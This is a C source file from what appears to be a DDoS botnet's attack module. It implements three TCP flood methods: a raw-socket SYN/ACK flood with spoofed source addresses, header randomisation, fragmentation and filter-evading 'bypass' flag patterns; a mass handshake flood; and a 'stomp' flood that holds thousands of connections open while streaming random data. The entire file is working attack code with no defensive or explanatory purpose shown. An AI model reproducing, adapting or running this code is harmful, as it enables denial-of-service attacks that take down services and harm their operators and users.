#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "tcp_method.h"
#include "../headers/protocol.h"
#include "../headers/attack_core.h"

#define MAX_STOMP_CONNS 4096
#define SOCKET_HOLD_TIMEOUT  30
#define SOCKET_KEEPALIVE_SEC  5

static uint8_t get_mode_flags(uint8_t mode) {
    switch (mode) {
        case MODE_TCP_SYN:      return TCP_FLAG_SYN;
        case MODE_TCP_ACK:      return TCP_FLAG_ACK;
        default:                return TCP_FLAG_SYN;
    }
}

static uint8_t bypass_flag_patterns[] = {
    TCP_FLAG_SYN,
    TCP_FLAG_ACK,
    TCP_FLAG_SYN | TCP_FLAG_ACK,
    TCP_FLAG_PSH | TCP_FLAG_ACK,
    TCP_FLAG_RST | TCP_FLAG_ACK,
    TCP_FLAG_FIN | TCP_FLAG_ACK,
    TCP_FLAG_SYN | TCP_FLAG_ECE | TCP_FLAG_CWR,
    TCP_FLAG_ACK | TCP_FLAG_PSH,
    TCP_FLAG_FIN,
    TCP_FLAG_URG | TCP_FLAG_PSH | TCP_FLAG_FIN,
    TCP_FLAG_ECE | TCP_FLAG_SYN,
    TCP_FLAG_CWR | TCP_FLAG_ACK,
    TCP_FLAG_RST | TCP_FLAG_SYN,
    TCP_FLAG_FIN | TCP_FLAG_PSH | TCP_FLAG_ACK,
    TCP_FLAG_SYN | TCP_FLAG_FIN,
    TCP_FLAG_ACK | TCP_FLAG_URG,
};

#define BYPASS_PATTERN_COUNT 16

static void* tcp_raw_flood(attack_params* params) {
    int fd = create_raw_socket();
    if (fd < 0) return NULL;
    
    uint8_t mode = get_attack_mode(params);
    uint8_t rand_level = get_rand_level(params);
    uint8_t ttl = get_ttl(params);
    uint8_t tos = get_tos(params);
    uint8_t frag_mode = get_frag_mode(params);
    spoof_config_t spoof = parse_spoof_option(params);
    int use_tcp_opts = get_tcp_opts_enabled(params);
    
    attack_option* flags_opt = find_option(params, OPT_TCPFLAGS);
    uint8_t base_flags = flags_opt ? get_option_u8(flags_opt) : get_mode_flags(mode);
    
    attack_option* srcport_opt = find_option(params, OPT_SRCPORT);
    port_range_t srcport_range = parse_port_range(srcport_opt);
    
    uint16_t psize = get_packet_size(params, 0);
    if (psize > 1400) psize = 1400;
    
    size_t tcp_opts_len = use_tcp_opts ? 20 : 0;
    size_t total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opts_len + psize;
    
    char* packets[BATCH_SIZE];
    struct mmsghdr msgvec[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];
    struct sockaddr_in dest;
    
    char* packet_template = (char*)malloc(total_len);
    if (!packet_template) {
        close(fd);
        return NULL;
    }
    memset(packet_template, 0, total_len);
    
    if (psize > 0) {
        uint8_t* payload = (uint8_t*)(packet_template + sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opts_len);
        for (uint16_t p = 0; p < psize; p++) {
            payload[p] = attack_rand_next() & 0xFF;
        }
    }
    
    if (use_tcp_opts) {
        uint8_t* tcp_opts = (uint8_t*)(packet_template + sizeof(struct iphdr) + sizeof(struct tcphdr));
        build_tcp_options(tcp_opts);
    }
    
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;
    
    for (int i = 0; i < BATCH_SIZE; i++) {
        packets[i] = (char*)malloc(total_len);
        if (!packets[i]) {
            for (int j = 0; j < i; j++) free(packets[j]);
            free(packet_template);
            close(fd);
            return NULL;
        }
        memcpy(packets[i], packet_template, total_len);
        
        iov[i].iov_base = packets[i];
        iov[i].iov_len = total_len;
        
        memset(&msgvec[i], 0, sizeof(msgvec[i]));
        msgvec[i].msg_hdr.msg_name = &dest;
        msgvec[i].msg_hdr.msg_namelen = sizeof(dest);
        msgvec[i].msg_hdr.msg_iov = &iov[i];
        msgvec[i].msg_hdr.msg_iovlen = 1;
    }
    
    free(packet_template);
    
    time_t end_time = time(NULL) + params->duration;
    uint32_t seq_counter = attack_rand_next();
    int bypass_idx = 0;
    int time_check_counter = 0;
    int delay_us = 0;

    pps_tracker_t pps;
    pps_tracker_init(&pps, get_pps_limit(params));
    
    attack_rand_init();
    
    while (params->active) {
        if (!pps_should_send(&pps, BATCH_SIZE)) {
            long sleep_time = pps_sleep_us(&pps);
            if (sleep_time > 0) usleep(sleep_time);
            if (++time_check_counter > 2000) { time_check_counter = 0; if (time(NULL) > end_time) break; }
            continue;
        }
        for (int i = 0; i < BATCH_SIZE && params->active; i++) {
            struct iphdr* ip = (struct iphdr*)packets[i];
            struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));
            uint8_t* tcp_opts = use_tcp_opts ? (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct tcphdr)) : NULL;
            
            uint8_t flags = base_flags;
            if (mode == MODE_TCP_ACK && rand_level >= RAND_MEDIUM) {
                flags = bypass_flag_patterns[bypass_idx];
                bypass_idx = (bypass_idx + 1) % BYPASS_PATTERN_COUNT;
            }
            
            uint16_t src_port = get_random_port(&srcport_range);
            uint16_t dst_port = ntohs(params->target_addr.sin_port);
            
            build_tcp_header(tcp, src_port, dst_port, seq_counter++, (flags & TCP_FLAG_ACK) ? attack_rand_next() : 0, flags);
            
            if (use_tcp_opts && tcp_opts) {
                build_tcp_options(tcp_opts);
                tcp->doff = (sizeof(struct tcphdr) + tcp_opts_len) / 4;
            }
            
            switch (rand_level) {
                case RAND_FULL:
                    apply_full_randomization(ip, tcp, &delay_us);
                    break;
                case RAND_MEDIUM:
                    apply_medium_randomization(ip, tcp);
                    break;
                case RAND_BASIC:
                    apply_basic_randomization(ip, tcp);
                    break;
                default:
                    break;
            }
            
            uint32_t src_ip = generate_spoofed_ip(&spoof);
            build_ip_header(ip, src_ip, params->target_addr.sin_addr.s_addr, IPPROTO_TCP, total_len, rand_level >= RAND_FULL ? attack_rand_next_range(48, 128) : ttl, tos);
            if (frag_mode != FRAG_NONE) apply_ip_frag(ip, frag_mode);

            tcp->check = 0;
            tcp->check = tcp_udp_checksum(tcp, sizeof(struct tcphdr) + tcp_opts_len + psize, ip->saddr, ip->daddr, IPPROTO_TCP);
        }
        
        int sent = sendmmsg_nonblock(fd, msgvec, BATCH_SIZE);
        if (sent == 0) {
            sched_yield();
        }

        if (delay_us > 0) {
            usleep(delay_us > 50 ? 50 : delay_us);
        }

        if (++time_check_counter > 2000) {
            time_check_counter = 0;
            if (time(NULL) > end_time) break;
        }
    }
    
    for (int i = 0; i < BATCH_SIZE; i++) {
        free(packets[i]);
    }
    close(fd);
    
    return NULL;
}

typedef struct {
    int fd;
    uint8_t state;
    time_t created;
    time_t last_send;
} stomp_conn_t;

static void* tcp_handshake_flood(attack_params* params) {
    uint16_t max_conns = get_max_conns(params, MAX_STOMP_CONNS);
    if (max_conns > MAX_STOMP_CONNS) max_conns = MAX_STOMP_CONNS;

    stomp_conn_t* conns = (stomp_conn_t*)calloc(max_conns, sizeof(stomp_conn_t));
    if (!conns) return NULL;

    uint16_t psize = get_packet_size(params, 64);
    if (psize > 1400) psize = 1400;

    char* send_data = (char*)malloc(psize);
    if (!send_data) { free(conns); return NULL; }
    for (uint16_t p = 0; p < psize; p++) send_data[p] = attack_rand_next() & 0xFF;

    struct sockaddr_in target;
    memcpy(&target, &params->target_addr, sizeof(target));

    time_t end_time = time(NULL) + params->duration;
    struct pollfd* pfds = (struct pollfd*)malloc(max_conns * sizeof(struct pollfd));
    if (!pfds) { free(send_data); free(conns); return NULL; }

    while (time(NULL) < end_time && params->active) {
        time_t batch_time = time(NULL);
        for (int i = 0; i < max_conns && params->active; i++) {
            if (conns[i].fd <= 0) {
                int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
                if (fd < 0) continue;
                connect(fd, (struct sockaddr*)&target, sizeof(target));
                conns[i].fd = fd;
                conns[i].state = 1;
                conns[i].created = batch_time;
            }
        }

        int nfds = 0;
        int poll_map[MAX_STOMP_CONNS];
        for (int i = 0; i < max_conns; i++) {
            if (conns[i].fd > 0) {
                pfds[nfds].fd = conns[i].fd;
                pfds[nfds].events = POLLOUT;
                pfds[nfds].revents = 0;
                poll_map[nfds] = i;
                nfds++;
            }
        }

        if (nfds > 0) poll(pfds, nfds, 50);

        time_t now = time(NULL);
        for (int j = 0; j < nfds; j++) {
            int i = poll_map[j];
            if (conns[i].fd <= 0) continue;

            if (now - conns[i].created > 3) {
                close(conns[i].fd);
                conns[i].fd = 0;
                conns[i].state = 0;
                continue;
            }

            if (pfds[j].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                close(conns[i].fd);
                conns[i].fd = 0;
                conns[i].state = 0;
                continue;
            }

            if (!(pfds[j].revents & POLLOUT)) continue;

            int error = 0;
            socklen_t len = sizeof(error);
            getsockopt(conns[i].fd, SOL_SOCKET, SO_ERROR, &error, &len);

            if (error == 0 && conns[i].state == 1) {
                for (int p = 0; p < (psize < 64 ? psize : 64); p++)
                    send_data[p] = attack_rand_next() & 0xFF;
                send(conns[i].fd, send_data, psize, MSG_NOSIGNAL);
                close(conns[i].fd);
                conns[i].fd = 0;
                conns[i].state = 0;
            }
        }
    }

    for (int i = 0; i < max_conns; i++) {
        if (conns[i].fd > 0) close(conns[i].fd);
    }
    free(pfds);
    free(send_data);
    free(conns);
    return NULL;
}

static void* tcp_stomp_flood(attack_params* params) {
    uint16_t max_conns = get_max_conns(params, MAX_STOMP_CONNS);
    if (max_conns > MAX_STOMP_CONNS) max_conns = MAX_STOMP_CONNS;

    uint16_t psize = get_packet_size(params, 1024);
    if (psize > 4096) psize = 4096;

    stomp_conn_t* conns = (stomp_conn_t*)calloc(max_conns, sizeof(stomp_conn_t));
    if (!conns) return NULL;

    char* send_buf = (char*)malloc(psize);
    if (!send_buf) { free(conns); return NULL; }
    for (uint16_t p = 0; p < psize; p++) send_buf[p] = attack_rand_next() & 0xFF;

    struct sockaddr_in target;
    memcpy(&target, &params->target_addr, sizeof(target));

    time_t end_time = time(NULL) + params->duration;
    struct pollfd* pfds = (struct pollfd*)malloc(max_conns * sizeof(struct pollfd));
    int* poll_map = (int*)malloc(max_conns * sizeof(int));
    if (!pfds || !poll_map) { free(send_buf); free(conns); free(pfds); free(poll_map); return NULL; }

    int time_check_counter = 0;

    while (params->active) {
        time_t now = time(NULL);

        /* Open connections for empty slots */
        for (int i = 0; i < max_conns && params->active; i++) {
            if (conns[i].fd <= 0) {
                int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
                if (fd < 0) continue;
                connect(fd, (struct sockaddr*)&target, sizeof(target));
                conns[i].fd = fd;
                conns[i].state = 1;
                conns[i].created = now;
                conns[i].last_send = 0;
            }
        }

        /* Poll for writable sockets */
        int nfds = 0;
        for (int i = 0; i < max_conns; i++) {
            if (conns[i].fd > 0) {
                pfds[nfds].fd = conns[i].fd;
                pfds[nfds].events = POLLOUT;
                pfds[nfds].revents = 0;
                poll_map[nfds] = i;
                nfds++;
            }
        }

        if (nfds > 0) poll(pfds, nfds, 1);

        for (int j = 0; j < nfds && params->active; j++) {
            int i = poll_map[j];
            if (conns[i].fd <= 0) continue;

            if (pfds[j].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                close(conns[i].fd);
                conns[i].fd = 0;
                conns[i].state = 0;
                continue;
            }

            if (!(pfds[j].revents & POLLOUT)) continue;

            /* State 1: connecting */
            if (conns[i].state == 1) {
                int error = 0;
                socklen_t len = sizeof(error);
                getsockopt(conns[i].fd, SOL_SOCKET, SO_ERROR, &error, &len);
                if (error == 0) {
                    conns[i].state = 2;
                } else {
                    close(conns[i].fd);
                    conns[i].fd = 0;
                    conns[i].state = 0;
                    continue;
                }
            }

            /* State 2: connected — stomp data continuously */
            if (conns[i].state == 2) {
                /* Recycle after hold timeout */
                if (now - conns[i].created > SOCKET_HOLD_TIMEOUT) {
                    close(conns[i].fd);
                    conns[i].fd = 0;
                    conns[i].state = 0;
                    continue;
                }

                /* Re-randomize first 64 bytes */
                int rand_len = psize < 64 ? psize : 64;
                for (int p = 0; p < rand_len; p++)
                    send_buf[p] = attack_rand_next() & 0xFF;

                /* Send payload */
                ssize_t s = send(conns[i].fd, send_buf, psize, MSG_NOSIGNAL | MSG_DONTWAIT);
                if (s <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(conns[i].fd);
                    conns[i].fd = 0;
                    conns[i].state = 0;
                }
            }
        }

        /* Connect timeout for state 1 */
        if (++time_check_counter > 500) {
            time_check_counter = 0;
            now = time(NULL);
            if (now > end_time) break;
            for (int i = 0; i < max_conns; i++) {
                if (conns[i].fd > 0 && conns[i].state == 1 && now - conns[i].created > 5) {
                    close(conns[i].fd);
                    conns[i].fd = 0;
                    conns[i].state = 0;
                }
            }
        }
    }

    for (int i = 0; i < max_conns; i++) {
        if (conns[i].fd > 0) close(conns[i].fd);
    }
    free(poll_map);
    free(pfds);
    free(send_buf);
    free(conns);
    return NULL;
}

void* tcp_method(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;
    
    attack_rand_init();
    
    uint8_t mode = get_attack_mode(params);
    
    switch (mode) {
        case MODE_TCP_HANDSHAKE:
            return tcp_handshake_flood(params);
        case MODE_TCP_SOCKET:
            return tcp_stomp_flood(params);
        case MODE_TCP_SYN:
        case MODE_TCP_ACK:
        default:
            return tcp_raw_flood(params);
    }
}
